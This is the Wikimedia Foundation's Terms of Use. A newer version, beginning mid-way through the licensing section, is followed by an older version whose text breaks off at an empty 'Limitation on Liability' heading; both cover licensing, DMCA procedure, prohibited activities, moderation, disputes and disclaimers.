    With both text content and non-text media, you agree to clearly indicate that the original work has been modified. If you are reusing text content in a wiki, it is sufficient to indicate in the page history that you made a change to the imported text. For each copy or modified version that you distribute, you agree to include a licensing notice stating which license the work is released under, along with either a hyperlink or URL to the text of the license or a copy of the license itself.




8. DMCA COMPLIANCE

The Wikimedia Foundation wants to ensure that the content that we host can be reused by other users without fear of liability and that it is not infringing the proprietary rights of others. In fairness to our users, as well as to other creators and copyright holders, our policy is to respond to notices of alleged infringement that comply with the formalities of the Digital Millennium Copyright Act ("DMCA"). Pursuant to the DMCA, we will terminate, in appropriate circumstances, users and account holders of our system and network who are repeat infringers on our Projects and services.

However, we also recognize that not every takedown notice is valid or in good faith. In such cases, we strongly encourage users to file counter-notifications when they appropriately believe a DMCA takedown demand is invalid or improper. For more information on what to do if you think a DMCA notice has been improperly filed, you may wish to consult the Lumen Database website.

If you are the owner of content that is being improperly used on one of the Projects without your permission, you may request that the content be removed by filing a notice under the DMCA. To make such a request, please email us at legalwikimediaorg or snail mail our designated agent.

Alternatively, you may make a request to our community, which often handles copyright issues faster and more effectively than the process prescribed under the DMCA. In that case, you can post a notice explaining your copyright concerns. For a non-exhaustive and non-authoritative list of the relevant processes for the different Project editions, visit the Copyright Problems page. Before filing a DMCA claim, you also have the option of sending an email to the community at infowikimediaorg.




9. THIRD-PARTY WEBSITES AND RESOURCES

You are solely responsible for your use of any third-party websites or resources. Although the Projects and Project Websites contain links to third-party websites and resources, we do not endorse and are not responsible or liable for their availability, accuracy, or the related content, products, or services (including, without limitation, any viruses or other disabling features), nor do we have any obligation to monitor such third-party content.




10. MANAGEMENT OF WEBSITES

The community has the primary role in creating and enforcing policies applying to the different Project editions. At the Wikimedia Foundation, we rarely intervene in community decisions about policy and its enforcement.

It is possible to notify us of illegal content, or content that violates our Terms of Use (including all policies and other documents incorporated by reference) for other reasons by contacting us directly. However, you can typically make a request directly to the Project's community: this may be more efficient, and is more consistent with our Projects' aim to empower the user community.

Each Project will usually provide "Help" or "Contact" pages for further guidance, or specific tools for reporting issues. Alternatively – if in doubt – you can ask members of the community for help, by sending an email to infowikimediaorg or a more language-specific address from the Volunteer Response Team page. Please note that these mailboxes are monitored by users of the Projects, not the Foundation. As a result, they should not be threatened or issued with legal demands.

If you contact the Foundation with a problem, we will typically explore whether and how existing community-led mechanisms can investigate and, where appropriate, resolve it.

In an unusual case, the need may arise, or the community may ask us, to address an especially problematic user or especially problematic content because of significant Project disturbance or dangerous behavior. In such cases, we reserve the right, at our sole discretion (or where legally compelled), to:

 * Investigate your use of the Projects or our services (a) to determine whether a violation of these Terms of Use, Project edition policy, or other applicable law or policy has occurred, or (b) to comply with any applicable law, legal process, or an appropriate governmental request;
 * Detect, prevent, or otherwise address fraud, false or unverifiable information, security, or technical issues or respond to user support requests;
 * Refuse, revert, disable, or restrict access to contributions of any user who violates these Terms of Use;
 * Ban a user from editing or contributing or block a user's account or access for actions violating these Terms of Use, including repeat posting of unlawful material under applicable law in line with human rights principles;
 * Take legal action against users who violate these Terms of Use (including reports to law enforcement authorities); and
 * Manage otherwise the Project websites in a manner designed to facilitate their proper functioning and protect the rights, property, and safety of ourselves and our users, licensors, partners, and the public.

Those Foundation moderation activities may be informed or performed by software (such as traffic flood ("Denial of Service") protection). In those cases human review is normally available, upon request.

In the interests of our users and the Projects, in the extreme circumstance that any individual has had their account or access blocked under this section, they are prohibited from creating or using another account on or seeking access to the same Project, unless we provide explicit permission. Without limiting the authority of the community, the Foundation itself will not ban a user from editing or contributing or block a user's account or access solely because of good faith criticism that does not result in actions otherwise violating these Terms of Use or community policies.

The Wikimedia community and its members may also take action when so allowed by the community or Foundation policies applicable to the specific Project edition, including but not limited to warning, investigating, blocking, or banning users who violate those policies. You agree to comply with the final decisions of dispute resolution bodies that are established by the community for the specific Project editions (such as arbitration committees); these decisions may include sanctions as set out by the policy of the specific Project edition.

Especially problematic users who have had accounts or access blocked on multiple Project editions may be subject to a ban from all of the Project editions, in accordance with the Global Ban Policy. In contrast to Board resolutions or these Terms of Use, policies established by the community, which may cover a single Project edition or multiple Projects editions (like the Global Ban Policy), may be modified by the relevant community according to its own procedures.

The blocking of an account or access or the banning of a user under this provision shall be in accordance with Section 13 of these Terms of Use.

If you believe we have not satisfactorily acted on a problematic content report, or if you have been subjected to a Foundation moderation action that you wish to challenge, you may be able to submit an appeal.  Other information about routes of appeal may also be explained to you at the time, or in Project-specific help pages.

We reserve the right to suspend (temporarily, or permanently) our handling of reports or other correspondence from users or third parties, whether about allegedly illegal or otherwise problematic content or conduct, or requesting appeals against moderation actions, if such correspondence was made in bad faith, repetitive, unfounded, and/or abusive. In appropriate circumstances, your email address may even be blocked on our email system(s), and you will then need to contact us at our postal address if you wish to further correspond with us during that block. For less serious cases (e.g. up to three polite emails about one or more meritless complaints), this is likely to be temporary. More frequent or more abusive communications are more likely to lead to permanent measures.




11. RESOLUTIONS AND PROJECT POLICIES

The Wikimedia Foundation Board of Trustees releases official policies from time to time. Some of these policies may be mandatory for a particular Project or Project edition, and, when they are, you agree to abide by them as applicable.




12. API TERMS

We make available a set of APIs, which include documentation and associated tools, to enable users to build products that promote free knowledge. By using our APIs, you agree to abide by all applicable policies governing the use of the APIs, which include but are not limited to the User-Agent Policy, the Robot Policy, and the API:Etiquette (collectively, "API Documentation"), which are incorporated into these Terms of Use by reference.




13. TERMINATION

Though we hope you will stay and continue to contribute to the Projects, you can stop using our services any time. In certain (hopefully unlikely) circumstances it may be necessary for either ourselves or the Wikimedia community or its members (as described in Section 10) to terminate part or all of our services, terminate these Terms of Use, block your account or access, or ban you as a user. If your account or access is blocked or otherwise terminated for any reason, your public contributions and a record of your activities on or in relation to the Projects (including any correspondence you have sent us) will be unaffected (subject to applicable policies), and you may still access our public pages for the sole purpose of reading publicly available content on the Projects. In such circumstances, however, you may not be able to access your account or settings. However, regardless of any other provision in these Terms of Use, we reserve the right to suspend or end the services at any time, with or without cause, and with or without notice. Even after your use and participation are banned, blocked or otherwise suspended, these Terms of Use will remain in effect with respect to relevant provisions, including Sections 1, 3, 4, 6, 7, 9-16, and 18.




14. DISPUTES AND JURISDICTION

Highlighted for emphasis

We hope that no serious disagreements arise involving you, but, in the event there is a dispute, we encourage you to seek resolution through the dispute resolution procedures or mechanisms provided by the Projects or Project editions and the Wikimedia Foundation. If you seek to file a legal claim against us, you agree to file and resolve it exclusively in a state or federal court located in San Francisco County, California. You also agree that the laws of the State of California and, to the extent applicable, the laws of the United States of America will govern these Terms of Use, as well as any legal claim that might arise between you and us (without reference to conflict of laws principles). You agree to submit to the personal jurisdiction of, and agree that venue is proper in, the courts located in San Francisco County, California, in any legal action or proceeding relating to us or these Terms of Use.

To ensure that disputes are dealt with soon after they arise, you agree that regardless of any statute or law to the contrary, any claim or cause of action you might have arising out of or related to use of our services or these Terms of Use must be filed within the applicable statute of limitations or, if earlier, one (1) year after the pertinent facts underlying such claim or cause of action could have been discovered with reasonable diligence (or be forever barred).

Marketing Company Mediations As described in section 4 of these Terms of Use, you agree to resolve violations of the Paid Contributions without Disclosure in a Marketing Company Mediation at the Foundation's discretion. Marketing Company Mediations are binding mediations where, at the end of either a half or full day session, any disputed items that remain unresolved will be decided by the mediator in a legally binding decision. They will be conducted in meetings by teleconference or videoconference. If an in-person meeting is required, then the Marketing Company Mediation will take place in San Francisco County, California. The parties will split all fees and expenses related to the mediation/arbitration equally.

You agree, as part of a Marketing Company Mediation, to cooperate with the Foundation, including by timely providing any documentation in your possession relating to your undisclosed paid editing activities including the accounts used, articles affected, and clients who purchased such services.

Marketing Company Mediations are subject to and governed by the Federal Arbitration Act to the extent that the mediator becomes an arbitrator. The prevailing party shall be entitled to recover its attorneys' fees (including all fees necessary to determine the applicability of the Marketing Company Mediation and to enforce the binding result) and all costs relating to the investigation and enforcement of its rights. A party may be deemed "prevailing" even if it is not successful on every claim asserted.

If for some reason the entirety of these Marketing Company Mediation requirements are found to be unenforceable, you agree to resolve any disputes as described in the beginning of this section.




15. DISCLAIMERS

Highlighted for emphasis

At the Wikimedia Foundation, we do our best to provide educational and informational content to a very wide audience, but your use of our services is at your sole risk. We provide these services on an "as is" and "as available" basis, and we expressly disclaim all express or implied warranties of all kinds, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. We make no warranty that our services will meet your requirements, be safe, secure, uninterrupted, timely, accurate, or error-free, or that your information will be secure.

We are not responsible for the content, data, or actions of third parties, and you release us, our directors, officers, employees, and agents from any claims and damages, known and unknown, arising out of or in any way connected with any claim you have against any such third parties. No advice or information, whether oral or written, obtained by you from us or through or from our services creates any warranty not expressly stated in these Terms of Use.

Any material downloaded or otherwise obtained through your use of our services is done at your own discretion and risk, and you will be solely responsible for any damage to your computer system or loss of data that results from the download of any such material. You agree that we have no responsibility or liability for the deletion of, or the failure to store or to transmit, any content or communication maintained by the service. We retain the right to create limits on use and storage at our sole discretion at any time with or without notice.

Some states or jurisdictions do not allow the types of disclaimers in this section, so they may not apply to you either in part or in full depending on the law.




16. LIMITATION ON LIABILITY

Highlighted for emphasis

The Wikimedia Foundation will not be liable to you or to any other party for any direct, indirect, incidental, special, consequential or exemplary damages, including but not limited to, damages for loss of profits, goodwill, use, data, or other intangible losses, regardless of whether we were advised of the possibility of such damage. In no event shall our liability exceed one thousand U.S. dollars (US$1,000.00) in aggregate. In the case that applicable law may not allow the limitation or exclusion of liability or incidental or consequential damages, the above limitation or exclusion may not apply to you, although our liability will be limited to the fullest extent permitted by applicable law.




17. MODIFICATIONS TO THESE TERMS OF USE

Just as the Wikimedia community's input is essential for the growth and maintenance of the Projects, we believe that community input is essential for these Terms of Use to properly serve our users. It is also essential for a fair contract. Therefore, we will provide these Terms of Use, as well as any substantial future revisions of these Terms of Use, to the community for comment at least thirty (30) days before the end of the comment period. If a future proposed revision is substantial, we will provide an additional 30 days for comments after posting a translation of the proposed revision in at least three languages (selected at our discretion). The community will be encouraged to translate the proposed revision in other languages as appropriate. For changes for legal or administrative reasons, to correct an inaccurate statement, or changes in response to community comments, we will provide at least three (3) days' notice.

Because it may be necessary to modify these Terms of Use from time to time, we will provide notice of such modifications and the opportunity to comment via the Project websites, and via a notification on WikimediaAnnounce-l. However, we ask that you please periodically review the most up-to-date version of these Terms of Use. Your continued use of our services after the new Terms of Use become official following the notice and review period constitutes an acceptance of these Terms of Use on your part. For the protection of the Wikimedia Foundation and other users like yourself, if you do not agree with our Terms of Use, you cannot use our services.




18. OTHER TERMS

These Terms of Use do not create an employment, agency, partnership, joint control or joint venture relationship between you and us, the Wikimedia Foundation. For the purposes of European Economic Area law, United Kingdom law, or other laws that involve a similar concept, you are not acting "under the authority of" the Foundation when you use the services. If you have not signed a separate agreement with us, these Terms of Use are the entire agreement between you and us. If there is any conflict between these Terms of Use and a signed written agreement between you and us, the signed agreement will control.

You agree that we may provide you with notices, including those regarding changes to the Terms of Use, by email, regular mail, or postings on the Projects or Project Websites.

If in any circumstance, we do not apply or enforce any provision of these Terms of Use, it is not a waiver of that provision.

You understand that, unless otherwise agreed to in writing by us, you have no expectation of compensation for any activity, contribution, or idea that you provide to us, the community, or the Projects or Project editions.

Notwithstanding any provision to the contrary in these Terms of Use, we (the Wikimedia Foundation) and you agree not to modify the applicable terms and requirements of any free license that is employed on the Projects or Project editions when such free license is authorized by these Terms of Use.

These Terms of Use were written in English (U.S.). While we hope that translations of these Terms of Use are accurate, in the event of any differences in meaning between the original English version and a translation, the original English version takes precedence.

If any provision or part of a provision of these Terms of Use is found unlawful, void, or unenforceable, that provision or part of the provision is deemed severable from these Terms of Use and will be enforced to the maximum extent permissible, and all other provisions of these Terms of Use will remain in full force and effect.


THANK YOU!

We appreciate your taking the time to read these Terms of Use, and we are very happy to have you contributing to the Projects and using our services. Through your contributions, you are helping to build something really big – not only an important collection of collaboratively edited reference Projects that provides education and information to millions who might otherwise lack access, but also a vibrant community of like-minded and engaged peers, focused on a very noble goal.

OUR TERMS OF USE

Imagine a world in which every single human being can freely share in the sum of all knowledge. That's our commitment. – Our Vision Statement

Welcome to Wikimedia! The Wikimedia Foundation, Inc. (“we” or “us”), is a nonprofit charitable organization whose mission is to empower and engage people around the world to collect and develop content under a free license or in the public domain, and to disseminate it effectively and globally, free of charge.

To support our vibrant community, we provide the essential infrastructure and organizational framework for the development of multilingual wiki Projects and their editions (as explained here) and other endeavors which serve this mission. We strive to make and keep educational and informational content from the Projects available on the internet free of charge, in perpetuity.

We welcome you (“you” or the “user”) as a reader, editor, author, or contributor of the Wikimedia Projects, and we encourage you to join the Wikimedia community. Before you participate, however, we ask that you please read and agree to the following Terms of Use (“Terms of Use”).


OVERVIEW

These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.

The community - the network of users who are constantly building and using the various sites or Projects - are the principal means through which the goals of the mission are achieved. The community contributes to and helps govern our sites. The community undertakes the critical function of creating and enforcing policies for the specific Project editions (such as the different language editions for the Wikipedia Project or the Wikimedia Commons multi-lingual edition).

You are welcome to join as a contributor, editor, or author, but you should follow the policies that govern each of the independent Project editions. The largest of our Projects is Wikipedia, but we host other Projects too, each with different objectives and work methods. Each Project edition has a team of contributors, editors or authors who work together to create and manage the content on that Project edition. You are welcome to join these teams and work with them to improve these Projects. Because we are dedicated to making content freely accessible to the public, we generally require that all content you contribute is available under a free license or in the public domain.

Please be aware that you are legally responsible for all of your contributions, edits, and re-use of Wikimedia content under the laws of the United States of America and other applicable laws (which may include the laws where you live or where you view or edit content). This means it is important that you use caution when posting content. In light of this responsibility, we have some rules about what you cannot post, most of which is either for your own protection or for the protection of other users like yourself. Please keep in mind that the content we host is for general informational purposes only, so if you need expert advice for a particular question (such as medical, legal, or financial issues), you should seek the help of a licensed or qualified professional. We also include other important notices and disclaimers, so please read these Terms of Use in their entirety.

For clarity, other organizations, such as local Wikimedia chapters and associations, that may share in the same mission are nevertheless legally independent and separate from the Wikimedia Foundation and have no responsibility for the operations of the website or its content.







1. OUR SERVICES

The Wikimedia Foundation is dedicated to encouraging the growth, development and distribution of free multilingual content, and to hosting the full content of these wiki-based Projects for the public free of charge. Our role is to host some of the largest collaboratively edited reference Projects in the world, which can be found here. However, we act only as a hosting service, maintaining the infrastructure and organizational framework that allows our users to build the Wikimedia Projects by contributing and editing content themselves. Because of our unique role, there are a couple of things you should be aware of when considering our relationship to you, the Projects, and the other users:

 1. We do not take an editorial role: Because the Wikimedia Projects are collaboratively edited, all of the content that we host is provided by users like yourself, and we do not take an editorial role. This means that we generally do not monitor or edit the content of the Project websites, and we do not take any responsibility for this content. Similarly, we do not endorse any opinions expressed via our services, and we do not represent or guarantee the truthfulness, accuracy, or reliability of any submitted community content. Instead, we simply provide access to the content that your fellow users have contributed and edited.
 2. You are responsible for your own actions: You are legally responsible for your edits and contributions on Wikimedia Projects, so for your own protection you should exercise caution and avoid contributing any content that may result in criminal or civil liability under any applicable laws. For clarity, applicable law includes at least the laws of the United States of America. Although we may not agree with such actions, we warn editors and contributors that authorities may seek to apply other country laws to you, including local laws where you live or where you view or edit content. WMF generally cannot offer any protection, guarantee, immunity or indemnification.


2. PRIVACY POLICY

We ask that you review the terms of our Privacy Policy, so that you are aware of how we collect and use your information. Because our services are used by people all over the world, personal information that we collect may be stored and processed in the United States of America or any other country in which we or our agents maintain facilities. By using our services, you consent to any such transfer of information outside your country.


3. CONTENT WE HOST

 1. You may find some material objectionable or erroneous: Because we provide a wide array of content that is produced or gathered by fellow users, you may encounter material that you find offensive, erroneous, misleading, mislabeled, or otherwise objectionable. We therefore ask that you use common sense and proper judgment when using our services.
 2. Our content is for general informational purposes only: Although we host a great deal of information that pertains to professional topics, including medical, legal, or financial issues, this content is presented for general informational purposes only. It should not be taken as professional advice. Please seek independent professional counseling from someone who is licensed or qualified in the applicable area in lieu of acting on any information, opinion, or advice contained in one of the Project websites.


4. REFRAINING FROM CERTAIN ACTIVITIES

The Projects hosted by the Wikimedia Foundation only exist because of the vibrant community of users like you who collaborate together to write, edit, and curate the content. We happily welcome your participation in this community. We encourage you to be civil and polite in your interactions with others in the community, to act in good faith, and to make edits and contributions aimed at furthering the mission of the shared Project.

Certain activities, whether legal or illegal, may be harmful to other users and violate our rules, and some activities may also subject you to liability. Therefore, for your own protection and for that of other users, you may not engage in such activities on our sites. These activities include:

Harassing and Abusing Others
 * Engaging in harassment, threats, stalking, spamming, or vandalism; and
 * Transmitting chain mail, junk mail, or spam to other users.

Violating the Privacy of Others
 * Infringing the privacy rights of others under the laws of the United States of America or other applicable laws (which may include the laws where you live or where you view or edit content);
 * Soliciting personally identifiable information for purposes of harassment, exploitation, violation of privacy, or any promotional or commercial purpose not explicitly approved by the Wikimedia Foundation; and
 * Soliciting personally identifiable information from anyone under the age of 18 for an illegal purpose or violating any applicable law regarding the health or well-being of minors.

Engaging in False Statements, Impersonation, or Fraud
 * Intentionally or knowingly posting content that constitutes libel or defamation;
 * With the intent to deceive, posting content that is false or inaccurate;
 * Attempting to impersonate another user or individual, misrepresenting your affiliation with any individual or entity, or using the username of another user with the intent to deceive; and
 * Engaging in fraud.

Committing Infringement
 * Infringing copyrights, trademarks, patents, or other proprietary rights under applicable law.

Misusing Our Services for Other Illegal Purposes
 * Posting child pornography or any other content that violates applicable law concerning child pornography;
 * Posting or trafficking in obscene material that is unlawful under applicable law; and
 * Using the services in a manner that is inconsistent with applicable law.

Engaging in Disruptive and Illegal Misuse of Facilities
 * Posting or distributing content that contains any viruses, malware, worms, Trojan horses, malicious code, or other device that could harm our technical infrastructure or system or that of our users;
 * Engaging in automated uses of the site that are abusive or disruptive of the services and have not been approved by the Wikimedia community;
 * Disrupting the services by placing an undue burden on a Project website or the networks or servers connected with a Project website;
 * Disrupting the services by inundating any of the Project websites with communications or other traffic that suggests no serious intent to use the Project website for its stated purpose;
 * Knowingly accessing, tampering with, or using any of our non-public areas in our computer systems without authorization; and
 * Probing, scanning, or testing the vulnerability of any of our technical systems or networks unless all the following conditions are met:

 * such actions do not unduly abuse or disrupt our technical systems or networks;
 * such actions are not for personal gain (except for credit for your work);
 * you report any vulnerabilities to MediaWiki developers (or fix it yourself); and
 * you do not undertake such actions with malicious or destructive intent.

We reserve the right to exercise our enforcement discretion with respect to the above terms.


5. PASSWORD SECURITY

You are responsible for safeguarding your own password and should never disclose it to any third party.


6. TRADEMARKS

Although you have considerable freedoms for re-use of the content on the Project websites, it is important that, at the Wikimedia Foundation, we protect our trademark rights so that we can protect our users from fraudulent impersonators. Because of this, we ask that you please respect our trademarks. All Wikimedia Foundation trademarks belong to the Wikimedia Foundation, and any use of our trade names, trademarks, service marks, logos, or domain names must be in compliance with these Terms of Use and in compliance with our Trademark Policy.


7. LICENSING OF CONTENT

To grow the commons of free knowledge and free culture, all users contributing to the Projects are required to grant broad permissions to the general public to re-distribute and re-use their contributions freely, so long as that use is properly attributed and the same freedom to re-use and re-distribute is granted to any derivative works. In keeping with our goal of providing free information to the widest possible audience, we require that when necessary all submitted content be licensed so that it is freely reusable by anyone who cares to access it.

You agree to the following licensing requirements:

 1. Text to which you hold the copyright: When you submit text to which you hold the copyright, you agree to license it under:
    * Creative Commons Attribution-ShareAlike 3.0 Unported License (“CC BY-SA”), and
    * GNU Free Documentation License (“GFDL”) (unversioned, with no invariant sections, front-cover texts, or back-cover texts).
    
    (Re-users may comply with either license or both.)
    
    The only exception is if the Project edition or feature requires a different license. In that case, you agree to license any text you contribute under that particular license. For example, at the publication of this version of the Terms of Use, English Wikinews mandates that all text content is licensed under the Creative Commons Attribution 2.5 Generic License (CC BY 2.5) and does not require a dual license with GFDL.
    
    
    Please note that these licenses do allow commercial uses of your contributions, as long as such uses are compliant with the terms.

 2. Attribution: Attribution is an important part of these licenses. We consider it giving credit where credit is due – to authors like yourself. When you contribute text, you agree to be attributed in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the article to which you contributed (since each article has a history page that lists all authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on the Project website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
 3. Importing text: You may import text that you have found elsewhere or that you have co-authored with others, but in such case you warrant that the text is available under terms that are compatible with the CC BY-SA 3.0 license (or, as explained above, another license when exceptionally required by the Project edition or feature)("CC BY-SA"). Content available only under GFDL is not permissible.
    
    You agree that, if you import text under a CC BY-SA license that requires attribution, you must credit the author(s) in a reasonable fashion. Where such credit is commonly given through page histories (such as Wikimedia-internal copying), it is sufficient to give attribution in the edit summary, which is recorded in the page history, when importing the text. The attribution requirements are sometimes too intrusive for particular circumstances (regardless of the license), and there may be instances where the Wikimedia community decides that imported text cannot be used for that reason.

 4. Non-text media: Non-text media on the Projects are available under a variety of different licenses that support the general goal of allowing unrestricted re-use and re-distribution. When you contribute non-text media, you agree to comply with the requirements for such licenses as described in our Licensing Policy, and also comply with the requirements of the specific Project edition or feature to which you are contributing. Also see the Wikimedia Commons Licensing Policy for more information on contributing non-text media to that Project.
 5. No revocation of license: Except as consistent with your license, you agree that you will not unilaterally revoke or seek invalidation of any license that you have granted under these Terms of Use for text content or non-text media contributed to the Wikimedia Projects or features, even if you terminate use of our services.
 6. Public domain content: Content that is in the public domain is welcome! It is important however that you confirm the public domain status of the content under the law of the United States of America as well as the laws of any other countries as required by the specific Project edition. When you contribute content that is in the public domain, you warrant that the material is actually in the public domain, and you agree to label it appropriately.
 7. Re-use: Re-use of content that we host is welcome, though exceptions exist for content contributed under "fair use" or similar exemptions under copyright law. Any re-use must comply with the underlying license(s).
    
    When you re-use or re-distribute a text page developed by the Wikimedia community, you agree to attribute the authors in any of the following fashions:
    
    1. Through hyperlink (where possible) or URL to the page or pages that you are re-using (since each page has a history page that lists all authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on the Project website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
    
    If the text content was imported from another source, it is possible that the content is licensed under a compatible CC BY-SA license but not GFDL (as described in “Importing text,” above). In that case, you agree to comply with the compatible CC BY-SA license and do not have the option to re-license it under GFDL. To determine the license that applies to the content that you seek to re-use or re-distribute, you should review the page footer, page history, and discussion page.
    
    In addition, please be aware that text that originated from external sources and was imported into a Project may be under a license that attaches additional attribution requirements. Users agree to indicate these additional attribution requirements clearly. Depending on the Project, such requirements may appear for example in a banner or other notations pointing out that some or all of the content was originally published elsewhere. Where there are such visible notations, re-users should preserve them.
    
    For any non-text media, you agree to comply with whatever license under which the work has been made available (which can be discovered by clicking on the work and looking at the licensing section on its description page or reviewing an applicable source page for that work). When re-using any content that we host, you agree to comply with the relevant attribution requirements as they pertain to the underlying license or licenses.
 8. Modifications or additions to material that you re-use: When modifying or making additions to text that you have obtained from a Project website, you agree to license the modified or added content under CC BY-SA 3.0 or later (or, as explained above, another license when exceptionally required by the specific Project edition or feature).
    
    When modifying or making additions to any non-text media that you have obtained from a Project website, you agree to license the modified or added content in accordance with whatever license under which the work has been made available.
    
    With both text content and non-text media, you agree to clearly indicate that the original work has been modified. If you are re-using text content in a wiki, it is sufficient to indicate in the page history that you made a change to the imported text. For each copy or modified version that you distribute, you agree to include a licensing notice stating which license the work is released under, along with either a hyperlink or URL to the text of the license or a copy of the license itself.


8. DMCA COMPLIANCE

The Wikimedia Foundation wants to ensure that the content that we host can be re-used by other users without fear of liability and that it is not infringing the proprietary rights of others. In fairness to our users, as well as to other creators and copyright holders, our policy is to respond to notices of alleged infringement that comply with the formalities of the Digital Millennium Copyright Act (DMCA). Pursuant to the DMCA, we will terminate, in appropriate circumstances, users and account holders of our system and network who are repeat infringers.

However, we also recognize that not every takedown notice is valid or in good faith. In such cases, we strongly encourage users to file counter-notifications when they appropriately believe a DMCA takedown demand is invalid or improper. For more information on what to do if you think a DMCA notice has been improperly filed, you may wish to consult the Chilling Effects website.

If you are the owner of content that is being improperly used on one of the Projects without your permission, you may request that the content be removed under the DMCA. To make such a request, please email us at legalwikimedia.org or snail mail our designated agent at this address.

Alternatively, you may make a request to our community, which often handles copyright issues faster and more effectively than prescribed under the DMCA. In that case, you can post a notice explaining your copyright concerns. For a non-exhaustive and non-authoritative list of the relevant processes for the different Project editions, look here. Before filing a DMCA claim, you also have the option of sending an email to the community at infowikimedia.org.


9. THIRD-PARTY WEBSITES AND RESOURCES

You are solely responsible for your use of any third-party websites or resources. Although the Projects contain links to third-party websites and resources, we do not endorse and are not responsible or liable for their availability, accuracy, or the related content, products, or services (including, without limitation, any viruses or other disabling features), nor do we have any obligation to monitor such third-party content.


10. MANAGEMENT OF WEBSITES

The community has the primary role in creating and enforcing policies applying to the different Project editions. At the Wikimedia Foundation, we rarely intervene in community decisions about policy and its enforcement. In an unusual case, the need may arise, or the community may ask us, to address an especially problematic user because of significant Project disturbance or dangerous behavior. In such cases, we reserve the right, but do not have the obligation to:

 * Investigate your use of the service (a) to determine whether a violation of these Terms of Use, Project edition policy, or other applicable law or policy has occurred, or (b) to comply with any applicable law, legal process, or appropriate governmental request;
 * Detect, prevent, or otherwise address fraud, security, or technical issues or respond to user support requests;
 * Refuse, disable, or restrict access to the contribution of any user who violates these Terms of Use;
 * Ban a user from editing or contributing or block a user's account or access for actions violating these Terms of Use, including repeat copyright infringement;
 * Take legal action against users who violate these Terms of Use (including reports to law enforcement authorities); and
 * Manage otherwise the Project websites in a manner designed to facilitate their proper functioning and protect the rights, property, and safety of ourselves and our users, licensors, partners, and the public.

In the interests of our users and the Projects, in the extreme circumstance that any individual has had his or her account or access blocked under this provision, he or she is prohibited from creating or using another account on or seeking access to the same Project, unless we provide explicit permission. Without limiting the authority of the community, the Wikimedia Foundation itself will not ban a user from editing or contributing or block a user's account or access solely because of good faith criticism that does not result in actions otherwise violating these Terms of Use or community policies.

The Wikimedia community and its members may also take action when so allowed by the community or Foundation policies applicable to the specific Project edition, including but not limited to warning, investigating, blocking, or banning users who violate those policies. You agree to comply with the final decisions of dispute resolution bodies that are established by the community for the specific Project editions (such as arbitration committees); these decisions may include sanctions as set out by the policy of the specific Project edition.

Especially problematic users who have had accounts or access blocked on multiple Project editions may be subject to a ban from all of the Project editions, in accordance with the Global Ban Policy. In contrast to Board resolutions or these Terms of Use, policies established by the community, which may cover a single Project edition or multiple Projects editions (like the Global Ban Policy), may be modified by the relevant community according to its own procedures.

The blocking of an account or access or the banning of a user under this provision shall be in accordance with Section 12 of these Terms of Use.


11. RESOLUTIONS AND PROJECT POLICIES

The Wikimedia Foundation Board of Trustees releases official policies from time to time. Some of these policies may be mandatory for a particular Project or Project edition, and, when they are, you agree to abide by them as applicable.


12. TERMINATION

Though we hope you will stay and continue to contribute to the Projects, you can stop using our services any time. In certain (hopefully unlikely) circumstances it may be necessary for either ourselves or the Wikimedia community or its members (as described in Section 10) to terminate part or all of our services, terminate these Terms of Use, block your account or access, or ban you as a user. If your account or access is blocked or otherwise terminated for any reason, your public contributions will remain publicly available (subject to applicable policies), and, unless we notify you otherwise, you may still access our public pages for the sole purpose of reading publicly available content on the Projects. In such circumstances, however, you may not be able to access your account or settings. We reserve the right to suspend or end the services at any time, with or without cause, and with or without notice. Even after your use and participation are banned, blocked or otherwise suspended, these Terms of Use will remain in effect with respect to relevant provisions, including Sections 1, 3, 4, 6, 7, 9-15, and 17.


13. DISPUTES AND JURISDICTION

Highlighted for emphasis

We hope that no serious disagreements arise involving you, but, in the event there is a dispute, we encourage you to seek resolution through the dispute resolution procedures or mechanisms provided by the Projects or Project editions and the Wikimedia Foundation. If you seek to file a legal claim against us, you agree to file and resolve it exclusively in a state or federal court located in San Francisco County, California. You also agree that the laws of the State of California and, to the extent applicable, the laws of the United States of America will govern these Terms of Use, as well as any legal claim that might arise between you and us (without reference to conflict of laws principles). You agree to submit to the personal jurisdiction of, and agree that venue is proper in, the courts located in San Francisco County, California, in any legal action or proceeding relating to us or these Terms of Use.

To ensure that disputes are dealt with soon after they arise, you agree that regardless of any statute or law to the contrary, any claim or cause of action you might have arising out of or related to use of our services or these Terms of Use must be filed within the applicable statute of limitations or, if earlier, one (1) year after the pertinent facts underlying such claim or cause of action could have been discovered with reasonable diligence (or be forever barred).


14. DISCLAIMERS

Highlighted for emphasis

At the Wikimedia Foundation, we do our best to provide educational and informational content to a very wide audience, but your use of our services is at your sole risk. We provide these services on an "as is" and "as available" basis, and we expressly disclaim all express or implied warranties of all kinds, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. We make no warranty that our services will meet your requirements, be safe, secure, uninterrupted, timely, accurate, or error-free, or that your information will be secure.

We are not responsible for the content, data, or actions of third parties, and you release us, our directors, officers, employees, and agents from any claims and damages, known and unknown, arising out of or in any way connected with any claim you have against any such third parties. No advice or information, whether oral or written, obtained by you from us or through or from our services creates any warranty not expressly stated in these Terms of Use.

Any material downloaded or otherwise obtained through your use of our services is done at your own discretion and risk, and you will be solely responsible for any damage to your computer system or loss of data that results from the download of any such material. You agree that we have no responsibility or liability for the deletion of, or the failure to store or to transmit, any content or communication maintained by the service. We retain the right to create limits on use and storage at our sole discretion at any time with or without notice.

Some states or jurisdictions do not allow the types of disclaimers in this section, so they may not apply to you either in part or in full depending on the law.


15. LIMITATION ON LIABILITY

Highlighted for emphasis

